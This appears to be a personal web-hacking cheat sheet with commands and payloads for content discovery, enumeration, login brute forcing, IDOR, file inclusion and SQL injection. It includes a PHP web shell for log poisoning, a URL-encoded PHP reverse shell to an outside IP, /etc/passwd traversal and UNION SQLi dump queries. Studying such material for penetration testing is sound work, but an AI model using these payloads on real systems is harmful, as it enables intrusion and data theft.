# Web Hacking

# Enumeration/Scanning

## Web Content Discovery

### Manual Contend Discovery

- Check `http://targetsite.com/robots.txt` for hidden folders or files;
- Check `http://targetsite.com/sitemap.xml` for website architecture and hidden areas;
- Check HTTP Response Header fields such as: "Server" (OS and version) and "X-Powered-By" (web langauge version);
- Check Framework Stack version and vulnerabilities;
- Google Dorking:
      
     | Filter   | Example             | Description                                      |
     |----------|---------------------|--------------------------------------------------|
     | site     | site:targetsite.com | results only from specified URL                  |
     | inurl    | inurl:admin         | results that have specified word in URL          |
     | filetype | filetype:pdf        | results which are a particular type of file ext. |
     | intitle  | intitle:admin       | results that contain the specified word in title |

### Automated Content Discovery:

```bash

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http:/targetsite.com/ 

```

```bash 

gobuster -u http://targetsite.com -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php,sh,txt,cgi,html,js,css

```

## Subdomain Enumeration

- Check TLS Certificate;
- Serach Engines, to reveal subdomains:
      - GOOGLE: `-site:www<span></span>.targetsite.com site:* .targetsite.com`

- DNS Bruteforce:
           
      dnsrecon -d targetsite.com -D /usr/share/wordlists/dnsmap.txt -t std

## Username Enumeration

For Login forms, if the HTTP response returns a different answer for existing usernames rather than non existent:

    ffuf -w /usr/share/wordlists/[usernames.txt] -u http:/targetsite.com -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "name_parameter=FUZZ&password_parameter=randompass" -[mx] [number or "string for mr"]

Where the match criteria is used in order to print only some matching Responses:

   | [mx] | Result                                              |
   |------|-----------------------------------------------------|
   | mc   | Match code (200, 204, 301, 302, 307, 401, 403, 405) |
   | mw   | Match amount of words in response                   |
   | mr   | Match defined "string" in response                  |
   | ml   | Match amount of lines in response                   |
   | ms   | Match HTTP response size                            |

But you can also exploit the registration form where the "Username already exist" response will be provided.


# Authenitcation Bypass

- Always look for .js or .php authentication scripts through Network tab (Advanced Tools F12), BurpSuite or Content Discovery. You could encounter authentication flaws.
- Check Cookies, try to decode them

# Brute Force

## FFUF bruteforcing

```bash

ffuf -w passwords.txt -X POST -d "username=[username]&password=[password]" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -[fx] [number or "string for fr"]

ffuf -w usernames.txt:W1,passwords.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -[fx] [number or "string for fr"]

```

## Hydra bruteforcing

      hydra -l [username] -P /usr/share/wordlists/rockyou.txt http-post-form://MACHINE_IP/"Account/login.aspx:UserName=^USER^&Password=^PASS^&LoginButton=LogIn:Login failed"

Where -fx could be {fc | fw | fr | fl | fs} which are dual with respect to the matching criteria. For example -fc 200 will return only answers with response codes different from 200 (e.g. 301 permanent redirects for correct login)

# IDOR

IDOR stands for Insecure Direct Object Reference. It is a kind of access control vulnerability arised when an applicetion uses user-input to access directly to objects. IDOR first appeared in OWASP 2007 Top Ten. IDOR is associated with Horizontal Privilege Escalation where an attacker could access reserved object by crafting a specific query.

- Check for IDOR vulnerabilities in encoded HTTP Response or Request Header fields.
- Check for IDOR vulnerabilities in Hashed ID and try to reverse them through [crackstation](https://crackstation.net/)
- Check for IDOR effectiveness by using two different accounts trying to switch among them.
- Check for ALL parameters in Network Tab of browser development tools (F12) for calls to any endpoint.

# LFI & RFI

LFI stands for Local File Inclusion, which is a technique where an attacker tricks a web application to retrieve a specific file from the system through a bad sanitized input form or query. It happens, for example, when requesting `http://targetsite.com/get.php?file=userCV.pdf`. If the "get.php" script is bad designed, a malicious user could force `http://targetsite.com/get.php?file=/etc/passwd`, getting all users on the system. LFI exploits PHP functions such as **include**, **require**, **include_once** and **require_once**. You must test out the URL parameter by adding the `dot-dot-slash` notation.

- Check `http://targetsite.com/get.php?file=../../../../etc/passwd` and similar queries. Generally the target is figuring out where is the "get.php" script executed because the Path Traversal (../../../.. ecc) starts from there.
- If the PHP script makes use of `$_GET['param']."ext"`, you could try to bypass it by means of the null character %00 at the end of the URL (ex. `http://targetsite.com/get.php?file=../../../../etc/passwd%00`). **Solved since PHP 5.4**. 
- Check Wrapper "php://filter" for encoding and decoding a target file: `http://targetsite.com/get.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd`. For all Wrappers have a look on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

## LFI-2-RCE

This means getting command execution on target exploiting LFI. 

- If an Apache server is vulnerable to LFI then you can access to `/var/log/apache2/access.log`. Check what are the Request Header parameters stored in the log (eg. User Agent) and then replace one of them with `<?php system($_GET['cmd']); ?>`. Next time you will access to the log file through LFI, the log file will be executed and so does the php injected script. You should then send a query like this:

      http://targetsite.com/get.php?file=../../../../var/log/apache2/access.log&cmd=whoami
      
      Or, you could spawn a reverse shell:
      
      http://targetsite.com/get.php?file=../../../../var/log/apache2/access.log&cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.8.32.131%22%2C5000)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27

Where we URL encoded `php -r '$sock=fsockopen("10.8.32.131",5000);exec("/bin/sh -i <&3 >&3 2>&3");'`. This is also known as **Log poisoning**.
For all other LFI-2-RCE (via /proc/self/environ, via upload, via PHPSESSID, via vsftpd logs ecc.) have a look on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion).

# SSRF

# XSS

# Command Injection

# SQL Injection

Structured Query Language (SQL) is a standarized language for relational databases (RDBMS). It can be used to create and modify database schema, to create and modify stored data and query them. On the other hand, a Database Management System (DBMS) is a software meant for the efficient creation, management and querying of databases. Examples of DBMS are the opensource softwares MySQL, SQLite, PostgreSQL.
SQL Injection is the vulnerability of websites that accept unsanitized data from input forms and forward them as a query to databases. There are several types of SQLi:

- **In-band-SQLi**: further divided in
      - *Error-based SQLi*: you gain info about database structure directly from the browser error answer
      - *Union-based SQLi*: makes use of the UNION clause in order to insert in an "empty" server answer, the SELECT data of our interest.
- **Blind-SQLi**: in this case you must apply a deductive method, making qeries and waiting for positive or negative answer (Boolean-SQLi). For example, by means of the SLEEP(2); it is possible to verify the answer, if the asnwer comes after 2s, this means "True", otherwise it is "False".

## Manual SQLi

- Check for number of columns in the TABLE: 

      ' UNION SELECT null ; --  
      ' UNION SELECT null,null ; --
      ' UNION SELECT null,null,null ; --

- Get name of the database (which in addition could contain several tables):

      ' UNION SELECT null,null,database() ; -- 
      
- Now proceed with enumeration of tables in the database to get confidential infos:

      ' UNION SELECT null,null,group_concat(table_name) FROM information_schema.tables WHERE table_schema='[db_name]' ; -- 
      
Where `information_schema` is a shared data structure of database which contains several attributes (for additional informations check [here](https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/
)).
If we are referring to the entire DB, we will use: `information_schema.tables WHERE table_schema='...` while if we are referring to a table we will call: `information_schema.columns WHERE table_name='...`

- Dump columns in a specified table: 

      ' UNION SELECT null,null,group_concat(column_name) FROM information_schema.columns WHERE table_name = '[table_name]' ; -- 
      
- Get entire columns data:

      ' UNION SELECT [column_name1],[column_name2],[column_name3] FROM [table_name] ; -- 


## Automated SQLi

Intercept a HTML request for which a SQLi vulnerability is possible. Save this request to a .txt file. Then:

    sqlmap -r request.txt --dbms=mysql --dump






